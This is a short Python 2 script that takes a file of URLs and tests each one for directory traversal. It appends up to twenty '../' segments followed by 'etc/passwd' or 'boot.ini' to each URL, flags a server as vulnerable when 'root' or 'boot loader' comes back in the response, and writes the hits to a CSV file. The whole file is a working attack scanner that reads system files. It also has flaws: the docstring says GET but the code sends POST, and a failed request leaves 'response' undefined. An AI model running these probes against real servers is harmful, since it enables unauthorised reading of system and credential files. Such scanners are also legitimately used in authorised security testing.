#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# pylint: disable=C0103
# pylint: disable=C0413
# pylint: disable=W0702

'''
Script that checks if GET parameter directory traversal vulnerability.

Dependencies:
    * python2
        # Debian/Ubuntu: apt-get install python
        # Fedora: dnf install python
'''

PAYLOADS = {
    'etc/passwd': 'root',
    'boot.ini': 'boot loader'
}

UP = '../'

import calendar
import os
import sys
import time
import requests

if len(sys.argv) != 2:
    print 'Usage: ' + sys.argv[0] + ' [filename]'
    print "    * filename - File that contains list of urls.\n"
    sys.exit(1)

URLS_FILE = sys.argv[1]

if not os.path.isfile(URLS_FILE):
    print 'Error: file ' + '"' + URLS_FILE + '"' + " doesn't exist.\n"
    sys.exit(1)

URLS = list()

RESULT_FILE = 'url-based-dir-traversal-' + str(calendar.timegm(time.gmtime())) + '.csv'
RESULT_FILE = os.path.dirname(os.path.realpath(__file__)) + '/' + RESULT_FILE

with open(URLS_FILE, 'r') as urls_file:
    for url in urls_file:
        url = url.strip()
        if url not in URLS:
            URLS.append(url)

if bool(URLS):
    for url in URLS:
        found = None
        print '> Testing URL: ' + url

        for payload, string in PAYLOADS.iteritems():
            for i in xrange(20):
                try:
                    response = requests.post(url + (i * UP) + payload, timeout=3)
                except:
                    pass

                if string in response.text:
                    print '> Vulnerability detected.'
                    found = (i * UP) + payload
                    break

            if bool(found):
                break

        if bool(found):
            with open(RESULT_FILE, 'a+') as result_file:
                result_file.write(url + ',' + found + "\n")
